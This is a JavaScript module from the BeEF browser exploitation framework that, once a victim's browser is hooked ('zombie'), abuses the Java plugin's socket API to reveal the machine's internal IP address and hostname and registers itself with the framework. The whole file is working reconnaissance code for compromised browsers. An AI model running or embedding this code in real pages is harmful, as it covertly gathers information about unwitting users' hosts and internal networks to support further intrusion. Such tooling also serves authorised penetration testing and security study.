/*!
 * @literal object: beef.net.local
 * 
 * Provides networking functions for the local/internal network of the zombie.
 */
beef.net.local = {
	
	sock: new java.net.Socket(),
	
	/**
	 * Returns the internal IP address of the zombie.
	 * @return: {String} the internal ip of the zombie.
	 * @error: return -1 if the internal ip cannot be retrieved.
	 */
	getLocalAddress: function() {
		if(! beef.browser.hasJava()) return -1;
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			
			return this.sock.getLocalAddress().getHostAddress();
		} catch(e) { return -1; }
	},
	
	/**
	 * Returns the internal hostname of the zombie.
	 * @return: {String} the internal hostname of the zombie.
	 * @error: return -1 if the hostname cannot be retrieved.
	 */
	getLocalHostname: function() {
		if(! beef.browser.hasJava()) return -1;
		
		try {
			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
			this.sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
			
			return this.sock.getLocalAddress().getHostName();
		} catch(e) { return -1; }
	}
	
};

beef.regCmp('beef.net.local');